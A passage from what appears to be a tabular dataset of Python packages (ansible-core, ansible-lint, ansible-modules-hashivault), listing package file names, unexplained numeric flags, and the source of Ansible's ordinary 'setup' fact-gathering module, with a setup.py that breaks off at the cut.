attribute.py base.py block.py collectionsearch.py conditional.py handler.py handler_task_include.py helpers.py included_file.py loop_control.py play.py playbook_include.py play_context.py definition.py include.py metadata.py requirement.py __init__.py role_include.py taggable.py task.py task_include.py __init__.py add_host.py assemble.py assert.py async_status.py command.py copy.py debug.py fail.py fetch.py gather_facts.py group_by.py include_vars.py normal.py package.py pause.py raw.py reboot.py script.py service.py set_fact.py set_stats.py shell.py template.py unarchive.py uri.py validate_argument_spec.py wait_for_connection.py yum.py __init__.py runas.py su.py sudo.py __init__.py base.py jsonfile.py memory.py __init__.py default.py junit.py minimal.py oneline.py tree.py __init__.py __init__.py local.py paramiko_ssh.py psrp.py ssh.py winrm.py __init__.py action_common_attributes.py action_core.py backup.py connection_pipelining.py constructed.py decrypt.py default_callback.py files.py inventory_cache.py result_format_callback.py return_common.py shell_common.py shell_windows.py template_common.py url.py url_windows.py validate.py vars_plugin_staging.py __init__.py core.py encryption.py mathstuff.py urls.py urlsplit.py __init__.py __init__.py advanced_host_list.py auto.py constructed.py generator.py host_list.py ini.py script.py toml.py yaml.py __init__.py loader.py config.py csvfile.py dict.py env.py file.py fileglob.py first_found.py indexed_items.py ini.py inventory_hostnames.py items.py lines.py list.py nested.py password.py pipe.py random_choice.py sequence.py subelements.py template.py together.py unvault.py url.py varnames.py vars.py __init__.py __init__.py cmd.py powershell.py sh.py __init__.py debug.py free.py host_pinned.py linear.py __init__.py __init__.py core.py files.py mathstuff.py __init__.py host_group_vars.py __init__.py __init__.py release.py native_helpers.py template.py vars.py __init__.py cmd_functions.py _collection_config.py _collection_finder.py _collection_meta.py __init__.py color.py context_objects.py display.py encrypt.py fqcn.py galaxy.py hashing.py helpers.py jsonrpc.py listify.py lock.py multiprocessing.py native_jinja.py path.py plugin_docs.py py3compat.py sentinel.py shlex.py singleton.py ssh_functions.py unicode.py unsafe_proxy.py vars.py version.py _junit_xml.py __init__.py clean.py fact_cache.py hostvars.py manager.py plugins.py reserved.py __init__.py __init__.py __init__.py __main__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt Apache-License.txt MIT-license.txt PSF-license.txt simplified_bsd.txt Makefile MANIFEST.in Makefile version_helper_test.py __init__.py version_helper.py __init__.py check-link-behavior.py PKG-INFO pyproject.toml README.rst requirements.txt setup.cfg setup.py Makefile test_diff.py test_validate_modules_regex.py network-integration.cfg network-integration.requirements.txt aliases main.yml aliases runme.sh aliases check_rlimit_and_maxfd.py custom_module.py sys_check.py custom_util.py main.yml adhoc-callback.stdout aliases ansible-test_.cfg ansible-testé.cfg callback_debug.py callback_meta.py module_common_regex_regression.sh no-extension playbook.yml playbookdir_cfg.ini runme.sh vars.yml aliases MANIFEST.json notjsonfile.py statichost.py noop.py fakemodule.py notrealmodule.py randommodule.py noop_vars_plugin.py MANIFEST.json notjsonfile.py statichost.py noop.py fakemodule.py notrealmodule.py randommodule.py noop_vars_plugin.py main.yml empty MANIFEST.json deprecation.py module.py plugin.py version_added.py fakecollrole.output fakemodule.output fakerole.output inventory test_docs.py test_docs_missing_description.py test_docs_non_iterable_status.py test_docs_no_metadata.py test_docs_no_status.py test_docs_removed_precedence.py test_docs_removed_status.py test_docs_returns.py test_docs_returns_broken.py test_docs_suboptions.py test_docs_yaml_anchors.py test_empty.py test_no_docs.py test_no_docs_non_iterable_status.py test_no_docs_no_metadata.py test_no_docs_no_status.py noop.output noop_vars_plugin.output notjsonfile.output randommodule-text.output randommodule.output argument_specs.yml main.yml empty main.yml runme.sh test.yml test_docs_returns.output test_docs_suboptions.output test_docs_yaml_anchors.output main.yml README.txt aliases cleanup-default.yml cleanup-freebsd.yml cleanup.yml testserver.py runme.sh setup.yml aliases build_bad_tar.py test_module.py reset_pulp.py setup_collections.py main.yml build.yml download.yml fail_fast_resolvelib.ym fail_fast_resolvelib.yml init.yml install.yml list.yml main.yml publish.yml pulp.yml revoke_gpg_key.yml setup_gpg.yml supported_resolvelib.ym supported_resolvelib.yml unsupported_resolvelib. unsupported_resolvelib.yml upgrade.yml verify.yml ansible.cfg.j2 main.yml aliases main.yml download.yml empty_installed_col empty_installed_collections.yml individual_collecti individual_collection_repo.yml main.yml multi_collection_re multi_collection_repo_all.yml multi_collection_repo_individual.yml reinstalling.yml requirements.yml scm_dependency.yml scm_dependency_dedu scm_dependency_deduplication.yml setup.yml setup_collection_ba setup_collection_bad_version.yml setup_multi_collect setup_multi_collection_repo.yml setup_recursive_scm setup_recursive_scm_dependency.yml test_invalid_versio test_invalid_version.yml test_supported_reso test_supported_resolvelib_versions.yml git_prefix_name git_prefix_name.yml name_and_type.y name_and_type.yml name_without_ty name_without_type.yml source_and_name source_and_name.yml source_and_name_and_type.yml source_only.yml main.yml aliases main.yml main.yml aliases invalid_sample.yml unicode.yml valid_sample.yml main.yml aliases cleanup.yml ansible.cfg inventory local.yml multi_play_1.yml multi_play_2.yml runme.sh setup.yml aliases adhoc_example1.py constraints.txt playbook_example1.py parse.py inventory runme.sh adhoc_example1.yml main.yml playbook_example1.yml setup.yml test.yml aliases galaxy.yml runtime.ym runtime.yml check_pylint.py bad.py vendor1.py vendor2.py world.py bad.py hello.py no_callable.py my_util.py __init__.py bad.py README.rst bad.py main.yml ignore.txt test_hello.py test_my_util.py constraints.txt requirements.txt aliases main.yml constraints.txt test_constraints.py requirements.txt runtime.yml validate.ps1 validate.py validate.psm1 coverage.sh git-at-collection-base.sh git-at-collection-root.sh git-common.bash install-git.yml integration-constraints.sh integration.sh sanity-vendor.sh sanity.sh uninstall-git.yml units-constraints.sh units.sh unsupported-directory.sh update-ignore.py validate-modules-collection-loader.sh venv-pythons.py runme.sh aliases main.yml aliases main.yml aliases main.yml aliases main.yml aliases main.yml aliases main.yml aliases main.yml aliases main.yml aliases main.yml aliases main.yml aliases main.yml aliases galaxy.yml ps_util.py hello.py win_util_args.ps1 win_util_args.py my_util.py PSUtil.psm1 main.yml test_hello.py test_my_util.py docker.sh runme.sh aliases runme.py runme.sh aliases empty-password encrypted-vault-password encrypted_file_encrypted_var_password example1_password example2_password example3_password faux-editor.py nonsecret.txt secret.vault format_1_1_AES256.yml format_1_2_AES256.yml myhost.yml testhost.yml broken-group-vars-tasks.yml broken-host-vars-tasks.yml broken-group-vars.yml vars inventory original-broken-host-vars original-group-vars.yml README.md some-vars vault-secret inventory.toml password-script.py main.yml main.yml main.yml vaulted_template.j2 main.yml main.yml main.yml main.yml README.md main.yml main.yml runme.sh single_vault_as_string.yml test-vault-client.py test_dangling_temp.yml test_utf8_value_in_filename.yml test_vault.yml test_vaulted_inventory.yml test_vaulted_inventory_toml.yml test_vaulted_template.yml test_vaulted_utf8_value.yml test_vault_embedded.yml test_vault_embedded_ids.yml test_vault_file_encrypted_embedded.yml vault-café.yml vault-password vault-password-ansible vault-password-wrong vault-secret.txt vaulted.inventory 50897.yml aliases always_block.yml inventory on_includes.yml play_level.yml runme.sh test_fatal.yml aliases main.yml main.yml main.yml apt-builddep.yml apt-multiarch.yml apt.yml downgrade.yml main.yml repo.yml upgrade.yml url-with-deps.yml default.yml Ubuntu-20.yml aliases main.yml apt_key.yml apt_key_binary.yml apt_key_inline_data.yml file.yml main.yml aliases main.yml apt.yml cleanup.yml main.yml mode.yaml mode_cleanup.yaml aliases runme.sh aliases argspec.py main.yml password_no_log.yml aliases fragment1 fragment2 fragment3 fragment4 fragment5 main.yml main.yml aliases assert_quiet.out.quiet.stderr assert_quiet.out.quiet.stdout inventory quiet.yml runme.sh aliases callback_test.yml async_test.py main.yml main.yml aliases junkping.py runme.sh test_async.yml normal.py aliases async_test.py main.yml main.yml aliases baz.txt default.yml main.yml su.yml sudo.yml bar.j2 default.yml aliases runme.sh tmpdir.py aliases test.yml cleanup_unpriv_users.yml cleanup.yml setup.yml test.yml inventory runme.sh setup_unpriv_users.yml aliases b64_latin1 b64_utf8 from_playbook main.yml main.yml b64_latin1_template.j2 b64_utf8_template.j2 from_playbook_template.j2 main.yml aliases download_binary_modules.yml all .gitignore helloworld.go Makefile main.yml test.sh test_binary_modules.yml aliases runme.sh aliases runme.sh aliases sshd_config main.yml add_block_to_existing_file.yml block_without_trailing_newline.yml create_file.yml diff.yml file_without_trailing_newline.yml insertafter.yml insertbefore.yml main.yml preserve_line_endings.yml validate.yml 69848.yml aliases always_failure_no_rescue_rc.yml always_failure_with_rescue_rc.yml always_no_rescue_rc.yml block_fail.yml block_fail_tasks.yml block_in_rescue.yml block_rescue_vars.yml fail.yml finalized_task.yml inherit_notify.yml issue29047.yml issue29047_tasks.yml issue71306.yml main.yml nested_fail.yml nested_nested_fail.yml main.yml main.yml main.yml main.yml runme.sh unsafe_failed_task.yml aliases runme.sh test-vars_prompt.py unsafe.yml unsupported.yml vars_prompt-1.yml vars_prompt-2.yml vars_prompt-3.yml vars_prompt-4.yml vars_prompt-5.yml vars_prompt-6.yml vars_prompt-7.yml aliases callback_default.out.check_markers_dry.stderr callback_default.out.check_markers_dry.stdout callback_default.out.check_markers_wet.stderr callback_default.out.check_markers_wet.stdout callback_default.out.check_nomarkers_dry.stderr callback_default.out.check_nomarkers_dry.stdout callback_default.out.check_nomarkers_wet.stderr callback_default.out.check_nomarkers_wet.stdout callback_default.out.default.stderr callback_default.out.default.stdout callback_default.out.display_path_on_failure.stderr callback_default.out.display_path_on_failure.stdout callback_default.out.failed_to_stderr.stderr callback_default.out.failed_to_stderr.stdout callback_default.out.fqcn_free.stdout callback_default.out.free.stdout callback_default.out.hide_ok.stderr callback_default.out.hide_ok.stdout callback_default.out.hide_skipped.stderr callback_default.out.hide_skipped.stdout callback_default.out.hide_skipped_ok.stderr callback_default.out.hide_skipped_ok.stdout callback_default.out.host_pinned.stdout callback_default.out.result_format_yaml.stderr callback_default.out.result_format_yaml.stdout callback_default.out.result_format_yaml_lossy_verbose.stderr callback_default.out.result_format_yaml_lossy_verbose.stdout callback_default.out.result_format_yaml_verbose.stderr callback_default.out.result_format_yaml_verbose.stdout callback_default.out.yaml_result_format_yaml_verbose.stderr callback_default.out.yaml_result_format_yaml_verbose.stdout include_me.yml inventory no_implicit_meta_banners.yml runme.sh test.yml test_2.yml test_async.yml test_dryrun.yml test_non_lockstep.yml test_yaml.yml aliases main.yml main.yml aliases check_mode-not-on-cli.yml check_mode-on-cli.yml check_mode.yml main.yml main.yml foo.txt main.yml foo.j2 main.yml runme.sh aliases runme.sh setup.yml test-cli.py test_k_and_K.py vaultsecret testvault.yml main.yml syntax_check.yml a.statichost.yml aliases ping.py test_ansiballz_cache_dupe_shortname.yml cache.statichost.yml check_populated_inventory.yml action1.py action1.py module1.py custom_jsonfile.py statichost.py contentadjmodule.py foomodule.py __init__.py __init__.py custom_adj_vars.py systestmodule.py maskedmodule.py testmodule.py main.yml ping.py bullmodule.py submod.py __init__.py broken_filter.py runtime.yml default_collection_playbook.yml play.yml embedded_module.py main.yml main.yml play.yml play.yml subdir_ping_action.py bypass_host_loop.py plugin_lookup.py subclassed_normal.py uses_redirected_import.py usercallback.py localconn.py frag.py my_subdir_filters.py myfilters.py myfilters2.py my_subdir_lookup.py mylookup.py mylookup2.py deprecated_ping.py subdir_ping_module.py ping.py testmodule.py testmodule_bad_docfrags.py uses_base_mu_granular_nested_import.py uses_collection_redirected_mu.py uses_core_redirected_mu.py uses_leaf_mu_flat_import.bak uses_leaf_mu_flat_import.py uses_leaf_mu_flat_import.yml uses_leaf_mu_granular_import.py uses_leaf_mu_module_import_from.py uses_mu_missing.py uses_mu_missing_redirect_collection.py uses_mu_missing_redirect_module.py uses_nested_same_as_func.py uses_nested_same_as_module.py win_csbasic_only.ps1 win_selfcontained.ps1 win_selfcontained.py win_uses_coll_csmu.ps1 win_uses_coll_psmu.ps1 win_uses_optional.ps1 AnotherCSMU.cs base.py leaf.py MyCSMU.cs MyCSMUOptional.cs MyPSMU.psm1 MyPSMUOptional.psm1 nested_same.py __init__.py __init__.py secondary.py subcs.cs submod.py subps.psm1 __init__.py mod_in_subpkg_with_init.py __init__.py subpkg_with_init.py mytests.py mytests2.py my_subdir_tests.py custom_vars.py main.yml main.yml main.yml main.yml main.yml main.yml main.yml main.yml main.yml main.yml main.yml runtime.yml v1_vars_plugin.py v2_vars_plugin.py override_formerly_core_masked_filter.py import_collection_,"# -*- coding: utf-8 -*-

# (c) 2012, Michael DeHaan <michael.dehaan@gmail.com>
# GNU General Public License v3.0+ (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)

from __future__ import absolute_import, division, print_function
__metaclass__ = type


DOCUMENTATION = '''
---
module: setup
version_added: historical
short_description: Gathers facts about remote hosts
options:
    gather_subset:
        version_added: ""2.1""
        description:
            - ""If supplied, restrict the additional facts collected to the given subset.
              Possible values: C(all), C(all_ipv4_addresses), C(all_ipv6_addresses), C(apparmor), C(architecture),
              C(caps), C(chroot),C(cmdline), C(date_time), C(default_ipv4), C(default_ipv6), C(devices),
              C(distribution), C(distribution_major_version), C(distribution_release), C(distribution_version),
              C(dns), C(effective_group_ids), C(effective_user_id), C(env), C(facter), C(fips), C(hardware),
              C(interfaces), C(is_chroot), C(iscsi), C(kernel), C(local), C(lsb), C(machine), C(machine_id),
              C(mounts), C(network), C(ohai), C(os_family), C(pkg_mgr), C(platform), C(processor), C(processor_cores),
              C(processor_count), C(python), C(python_version), C(real_user_id), C(selinux), C(service_mgr),
              C(ssh_host_key_dsa_public), C(ssh_host_key_ecdsa_public), C(ssh_host_key_ed25519_public),
              C(ssh_host_key_rsa_public), C(ssh_host_pub_keys), C(ssh_pub_keys), C(system), C(system_capabilities),
              C(system_capabilities_enforced), C(user), C(user_dir), C(user_gecos), C(user_gid), C(user_id),
              C(user_shell), C(user_uid), C(virtual), C(virtualization_role), C(virtualization_type).
             Can specify a list of values to specify a larger subset.
             Values can also be used with an initial C(!) to specify that
              that specific subset should not be collected.  For instance:
              C(!hardware,!network,!virtual,!ohai,!facter). If C(!all) is specified
              then only the min subset is collected. To avoid collecting even the
              min subset, specify C(!all,!min). To collect only specific facts,
              use C(!all,!min), and specify the particular fact subsets.
              Use the filter parameter if you do not want to display some collected
              facts.""
        type: list
        elements: str
        default: ""all""
    gather_timeout:
        version_added: ""2.2""
        description:
            - Set the default timeout in seconds for individual fact gathering.
        type: int
        default: 10
    filter:
        version_added: ""1.1""
        description:
            - If supplied, only return facts that match one of the shell-style
              (fnmatch) pattern. An empty list basically means 'no filter'.
              As of Ansible 2.11, the type has changed from string to list
              and the default has became an empty list. A simple string is
              still accepted and works as a single pattern. The behaviour
              prior to Ansible 2.11 remains.
        type: list
        elements: str
        default: []
    fact_path:
        version_added: ""1.3""
        description:
            - Path used for local ansible facts (C(*.fact)) - files in this dir
              will be run (if executable) and their results be added to C(ansible_local) facts.
              If a file is not executable it is read instead.
              File/results format can be JSON or INI-format. The default C(fact_path) can be
              specified in C(ansible.cfg) for when setup is automatically called as part of
              C(gather_facts).
              NOTE - For windows clients, the results will be added to a variable named after the
              local file (without extension suffix), rather than C(ansible_local).
            - Since Ansible 2.1, Windows hosts can use C(fact_path). Make sure that this path
              exists on the target host. Files in this path MUST be PowerShell scripts C(.ps1)
              which outputs an object. This object will be formatted by Ansible as json so the
              script should be outputting a raw hashtable, array, or other primitive object.
        type: path
        default: /etc/ansible/facts.d
description:
    - This module is automatically called by playbooks to gather useful
      variables about remote hosts that can be used in playbooks. It can also be
      executed directly by C(/usr/bin/ansible) to check what variables are
      available to a host. Ansible provides many I(facts) about the system,
      automatically.
    - This module is also supported for Windows targets.
extends_documentation_fragment:
  -  action_common_attributes
  -  action_common_attributes.facts
attributes:
    check_mode:
        support: full
    diff_mode:
        support: none
    facts:
        support: full
    platform:
        platforms: posix, windows
notes:
    - More ansible facts will be added with successive releases. If I(facter) or
      I(ohai) are installed, variables from these programs will also be snapshotted
      into the JSON file for usage in templating. These variables are prefixed
      with C(facter_) and C(ohai_) so it's easy to tell their source. All variables are
      bubbled up to the caller. Using the ansible facts and choosing to not
      install I(facter) and I(ohai) means you can avoid Ruby-dependencies on your
      remote systems. (See also M(community.general.facter) and M(community.general.ohai).)
    - The filter option filters only the first level subkey below ansible_facts.
    - If the target host is Windows, you will not currently have the ability to use
      C(filter) as this is provided by a simpler implementation of the module.
    - This module should be run with elevated privileges on BSD systems to gather facts like ansible_product_version.
    - For more information about delegated facts,
      please check U(https://docs.ansible.com/ansible/latest/user_guide/playbooks_delegation.html#delegating-facts).
author:
    - ""Ansible Core Team""
    - ""Michael DeHaan""
'''

EXAMPLES = """"""
# Display facts from all hosts and store them indexed by I(hostname) at C(/tmp/facts).
# ansible all -m ansible.builtin.setup --tree /tmp/facts

# Display only facts regarding memory found by ansible on all hosts and output them.
# ansible all -m ansible.builtin.setup -a 'filter=ansible_*_mb'

# Display only facts returned by facter.
# ansible all -m ansible.builtin.setup -a 'filter=facter_*'

# Collect only facts returned by facter.
# ansible all -m ansible.builtin.setup -a 'gather_subset=!all,facter'

- name: Collect only facts returned by facter
  ansible.builtin.setup:
    gather_subset:
      - '!all'
      - '!<any valid subset>'
      - facter

- name: Collect only selected facts
  ansible.builtin.setup:
    filter:
      - 'ansible_distribution'
      - 'ansible_machine_id'
      - 'ansible_*_mb'

# Display only facts about certain interfaces.
# ansible all -m ansible.builtin.setup -a 'filter=ansible_eth[0-2]'

# Restrict additional gathered facts to network and virtual (includes default minimum facts)
# ansible all -m ansible.builtin.setup -a 'gather_subset=network,virtual'

# Collect only network and virtual (excludes default minimum facts)
# ansible all -m ansible.builtin.setup -a 'gather_subset=!all,network,virtual'

# Do not call puppet facter or ohai even if present.
# ansible all -m ansible.builtin.setup -a 'gather_subset=!facter,!ohai'

# Only collect the default minimum amount of facts:
# ansible all -m ansible.builtin.setup -a 'gather_subset=!all'

# Collect no facts, even the default minimum subset of facts:
# ansible all -m ansible.builtin.setup -a 'gather_subset=!all,!min'

# Display facts from Windows hosts with custom facts stored in C(C:\\custom_facts).
# ansible windows -m ansible.builtin.setup -a ""fact_path='c:\\custom_facts'""

# Gathers facts for the machines in the dbservers group (a.k.a Delegating facts)
- hosts: app_servers
  tasks:
    - name: Gather facts from db servers
      ansible.builtin.setup:
      delegate_to: ""{{ item }}""
      delegate_facts: true
      loop: ""{{ groups['dbservers'] }}""
""""""

# import module snippets
from ..module_utils.basic import AnsibleModule

from ansible.module_utils._text import to_text
from ansible.module_utils.facts import ansible_collector, default_collectors
from ansible.module_utils.facts.collector import CollectorNotFoundError, CycleFoundInFactDeps, UnresolvedFactDep
from ansible.module_utils.facts.namespace import PrefixFactNamespace


def main():
    module = AnsibleModule(
        argument_spec=dict(
            gather_subset=dict(default=[""all""], required=False, type='list', elements='str'),
            gather_timeout=dict(default=10, required=False, type='int'),
            filter=dict(default=[], required=False, type='list', elements='str'),
            fact_path=dict(default='/etc/ansible/facts.d', required=False, type='path'),
        ),
        supports_check_mode=True,
    )

    gather_subset = module.params['gather_subset']
    gather_timeout = module.params['gather_timeout']
    filter_spec = module.params['filter']

    # TODO: this mimics existing behavior where gather_subset=[""!all""] actually means
    #       to collect nothing except for the below list
    # TODO: decide what '!all' means, I lean towards making it mean none, but likely needs
    #       some tweaking on how gather_subset operations are performed
    minimal_gather_subset = frozenset(['apparmor', 'caps', 'cmdline', 'date_time',
                                       'distribution', 'dns', 'env', 'fips', 'local',
                                       'lsb', 'pkg_mgr', 'platform', 'python', 'selinux',
                                       'service_mgr', 'ssh_pub_keys', 'user'])

    all_collector_classes = default_collectors.collectors

    # rename namespace_name to root_key?
    namespace = PrefixFactNamespace(namespace_name='ansible',
                                    prefix='ansible_')

    try:
        fact_collector = ansible_collector.get_ansible_collector(all_collector_classes=all_collector_classes,
                                                                 namespace=namespace,
                                                                 filter_spec=filter_spec,
                                                                 gather_subset=gather_subset,
                                                                 gather_timeout=gather_timeout,
                                                                 minimal_gather_subset=minimal_gather_subset)
    except (TypeError, CollectorNotFoundError, CycleFoundInFactDeps, UnresolvedFactDep) as e:
        # bad subset given, collector, idk, deps declared but not found
        module.fail_json(msg=to_text(e))

    facts_dict = fact_collector.collect(module=module)

    module.exit_json(ansible_facts=facts_dict)


if __name__ == '__main__':
    main()
",0
ansible-lint-6.4.0,0,1,1,1,0,0,0,0,.ansible-lint ansible-lint.spec dictionary.txt .coveragerc .darglint .flake8 .gitattributes CODEOWNERS CODE_OF_CONDUCT.md CONTRIBUTING.md dependabot.yml bug_report.md config.yml ISSUE_TEMPLATE.md release-drafter.yml SECURITY.md ack.yml push.yml release.yml tox.yml .gitignore .git_archival.txt .isort.cfg .packit.yaml .pre-commit-config.yaml .pre-commit-hooks.yaml .prettierignore .prettierrc .pylintrc .readthedocs.yml extensions.json .yamllint codecov.yml conftest.py COPYING cspell.config.yaml DCO_1_1.md .gitignore .nojekyll conf.py configuring.md contributing.md custom-rules.md default_rules.md index.md installing.md LICENSE.mit.txt philosophy.md .gitignore profiles.md README.md rules.md rules_table_generator_ext.py usage.md ansible-lint.svg logo_invert.png theme_overrides.css ansible-lint.yml ansible-navigator.yml .ansible-lint ansible-navigator.yml encoding.j2 runtime.yml execution-environment.yml execution-environment.yml galaxy.yml all.yml localhost.yml broken_dev_inventory.yml inventory.yml production.yml lineno.yml runtime.yml some.j2.yaml some.yaml-too always-run-success.yml become-user-without-become-failure.yml become-user-without-become-success.yml become.transformed.yml become.yml block.yml blockincludes.yml blockincludes2.yml bracketsmatchtest.yml command-check-failure.yml command-check-success.yml common-include-1.yml common-include-2.yml conflicting_action.yml contains_secrets.transformed.yml contains_secrets.yml custom_module.yml ematcher-rule.yml empty_playbook.yml example.yml extra_vars.yml included-handlers.yml y.yml include-import-tasks-in-role.yml include-in-block.yml include.yml jinja2-when-failure.yml jinja2-when-success.yml json-schema-fail.yml lots_of_warnings.transformed.yml lots_of_warnings.yml mocked_dependency.yml multiline-brackets-do-not-match-test.yml multiline-bracketsmatchtest.yml no-prompting.yml nomatches.yml nomatchestest.transformed.yml nomatchestest.yml noqa-nested.yml noqa.yml norole.yml norole2.yml package-check-failure.yml package-check-success.yml pass-loop-var-prefix.yml play.yml playbook-imported.yml playbook-parent.yml README.md rule-no-tabs.yml rule-only-builtins.yml schema-error-string.yml skiptasks.yml syntax-error-string.yml syntax-error.yml task-has-name-failure.yml task-has-name-success.yml taskimports.yml taskincludes.yml main.yml empty_blocks.yml include-in-block-inner.yml included-with-lint.yml nestedincludes.yml passing_task.yml simple_task.yml varset.yml varunset.yml x.yml not-valid.yaml unicode.transformed.yml unicode.yml using-bare-variables-failure.yml using-bare-variables-success.yml valid_with_alt_extension.yaml var-spacing.yml empty_vars.transformed.yml empty_vars.yml invalid_vars_schema.yml not_decryptable.yml other.yml strings.transformed.yml strings.yml settings.yml var-spacing.yml with-skip-tag-id.yml with-umlaut-_.yml requirements.yml requirements.yml main.yaml main.yml argument_specs.yml main.yml main.yml argument_specs.yml main.yml main.yaml main.yml main.yaml main.yml requirements.yml invalud_meta_schema fail.yml pass.yml main.yml main.yml fail.yml pass.yml main.yml imported_tasks.yml included_tasks.yml main.yml a_file main.yml main.yml requirements.yml include-import-role.yml main.yml world.yml main.yml main.yml main.yaml task_has_tag.py playbook.yml main.yml invalid.yml valid.yml mypy.ini PKG-INFO playbook.yml fake_module.py pyproject.toml pytest.ini README.md requirements.txt requirements.yml setup.cfg app.py cli.py color.py config.py constants.py profiles.yml errors.py file_utils.py __init__.py generate_docs.py loaders.py logger.py py.typed command_instead_of_module.py command_instead_of_shell.py __init__.py deprecated_bare_vars.md deprecated_bare_vars.py deprecated_command_syntax.py deprecated_local_action.py deprecated_module.py empty_string_compare.py fqcn_builtins.py git_latest.py hg_latest.py ignore_errors.py inline_env_var.py key_order.py literal_compare.py meta_incorrect.py meta_no_info.py meta_no_tags.py meta_video_links.py no_changed_when.py no_handler.py no_jinja_nesting.py no_jinja_when.py no_log_password.py no_loop_var_prefix.py no_prompting.py no_relative_paths.py no_same_owner.py no_tabs.py only_builtins.py package_latest.py partial_become.py playbook_extension.py risky_file_permissions.py risky_octal.py risky_shell_pipe.py role_name.py schema.py syntax_check.py unnamed_task.py var_naming.py var_spacing.md var_spacing.py yaml.md yaml.py __init__.py runner.py ansible-lint-config.json ansible-navigator-config.json arg_specs.json execution-environment.json galaxy.json inventory.json meta-runtime.json meta.json playbook.json requirements.json tasks.json vars.json __init__.py skip_utils.py fixtures.py __init__.py text.py transformer.py utils.py version.py yaml_utils.py rules.py __init__.py _mockings.py _version.py __init__.py __main__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt bar.txt conftest.py example_com_rule.py __init__.py custom_rule.py __init__.py __init__.py ansible-config-invalid.yml ansible-config.yml config-with-extra-vars.yml config-with-relative-path.yml config-with-write-all.yml config-with-write-none.yml config-with-write-subset.yml exclude-paths-with-expands.yml exclude-paths.yml fmt-1.yml fmt-2.yml fmt-3.yml fmt-1.yml fmt-2.yml fmt-3.yml fmt-1.yml fmt-2.yml fmt-3.yml .yamllint parseable.yml quiet.yml rulesdir-defaults.yml rulesdir.yml show-abspath.yml show-relpath.yml skip-tags.yml tags.yml test_regenerate_formatting_fixtures.py unknown-type.yml .yamllint verbosity.yml __init__.py foo.txt galaxy. README.md test-collection.yml test_module_1_failed.py main.yml main.yml b_failed.py test_module_3_failed.py main.yml test.yml test_module_1_f main.yml main.yml b_failed_c test_module_3_f main.yml test_module_1_success.p main.yml main.yml b_success.py test_module_3_success.p main.yml ematcher.py raw_task.py unset_variable_matcher.py __init__.py test_deprecated_module.py test_inline_env_var.py test_line_too_long.py test_literal_compare.py test_meta_change_from_default.py test_meta_no_info.py test_meta_video_links.py test_nested_jinja_rule.py test_no_changed_when.py test_no_jinja_when.py test_no_relative_paths.py test_octal_permissions.py test_package_latest.py test_risky_shell_pipe.py test_role_names.py test_unnamed_task.py test_use_bare_variables.py test_use_handler_rather_than_when_changed.py __init__.py test_ansiblelintrule.py test_ansiblesyntax.py test_boot.py test_cli_role_paths.py test_commandline_invocations_same_as_config.py test_dependencies_in_meta.py test_eco.py test_examples.py test_file_path_evaluation.py test_file_utils.py test_formatter.py test_formatter_base.py test_formatter_json.py test_formatter_sarif.py test_import_include_role.py test_import_playbook.py test_import_with_malformed.py test_include_miss_file_with_role.py test_lint_rule.py test_list_rules.py test_load_failure.py test_local_content.py test_main.py test_matcherrror.py test_profiles.py test_rules_collection.py test_rule_properties.py test_runner.py test_skiputils.py test_skip_import_playbook.py test_skip_inside_yaml.py test_skip_playbook_items.py test_task_includes.py test_transformer.py test_transform_mixin.py test_utils.py test_verbosity.py test_with_skip_tagid.py test_yaml_utils.py __init__.py get-version.sh test-setup.sh update-version.sh tox.ini,,1
ansible-modules-hashivault-4.7.0,0,1,1,1,1,0,0,0,hashivault_approle_role.py hashivault_approle_role_get.py hashivault_approle_role_id.py hashivault_approle_role_list.py hashivault_approle_role_secret.py hashivault_approle_role_secret_accessor_ hashivault_approle_role_secret_get.py hashivault_approle_role_secret_list.py hashivault_audit.py hashivault_audit_list.py hashivault_auth_ldap.py hashivault_auth_list.py hashivault_auth_method.py hashivault_aws_auth_config.py hashivault_aws_auth_role.py hashivault_azure_auth_config.py hashivault_azure_auth_role.py hashivault_azure_secret_engine_config.py hashivault_azure_secret_engine_role.py hashivault_cluster_status.py hashivault_consul_secret_engine_config.p hashivault_consul_secret_engine_role.py hashivault_db_secret_engine_config.py hashivault_db_secret_engine_role.py hashivault_delete.py hashivault_generate_root.py hashivault_generate_root_cancel.py hashivault_generate_root_init.py hashivault_generate_root_status.py hashivault_identity_entity.py hashivault_identity_entity_alias.py hashivault_identity_group.py hashivault_identity_group_alias.py hashivault_init.py hashivault_k8s_auth_config.py hashivault_k8s_auth_role.py hashivault_ldap_group.py hashivault_leader.py hashivault_list.py hashivault_namespace.py hashivault_oidc_auth_method_config.py hashivault_oidc_auth_role.py hashivault_pki_ca.py hashivault_pki_ca_set.py hashivault_pki_cert_get.py hashivault_pki_cert_issue.py hashivault_pki_cert_list.py hashivault_pki_cert_revoke.py hashivault_pki_cert_sign.py hashivault_pki_crl.py hashivault_pki_crl_get.py hashivault_pki_crl_rotate.py hashivault_pki_role.py hashivault_pki_role_get.py hashivault_pki_role_list.py hashivault_pki_set_signed.py hashivault_pki_tidy.py hashivault_pki_url.py hashivault_pki_url_get.py hashivault_policy.py hashivault_policy_get.py hashivault_policy_list.py hashivault_read.py hashivault_read_to_file.py hashivault_rekey.py hashivault_rekey_cancel.py hashivault_rekey_init.py hashivault_rekey_status.py hashivault_rekey_verify.py hashivault_seal.py hashivault_secret.py hashivault_secret_engine.py hashivault_secret_list.py hashivault_ssh_role.py hashivault_ssh_role_list.py hashivault_status.py hashivault_token_create.py hashivault_token_lookup.py hashivault_token_renew.py hashivault_token_revoke.py hashivault_token_role.py hashivault_token_role_list.py hashivault_unseal.py hashivault_userpass.py hashivault_write.py hashivault_write_from_file.py _hashivault_approle_role_create.py _hashivault_approle_role_secret_create.p _hashivault_approle_role_secret_delete.p _hashivault_audit_enable.py _hashivault_auth_enable.py _hashivault_aws_ec2_role_create.py _hashivault_mount_tune.py _hashivault_policy_delete.py _hashivault_policy_set.py _hashivault_policy_set_from_file.py _hashivault_secret_disable.py _hashivault_secret_enable.py _hashivault_userpass_create.py _hashivault_userpass_delete.py __init__.py hashivault.py hashivault_read_to_file.py hashivault_write_from_file.py hashivault.py hashivault.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt AUTHORS CHANGELOG.rst LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"#!/usr/bin/env python
from setuptools import setup

py_files = [
    ""ansible/module_utils/hashivault"",
    ""ansible/plugins/lookup/hashivault"",
    ""ansible/plugins/action/hashivault_read_to_file"",
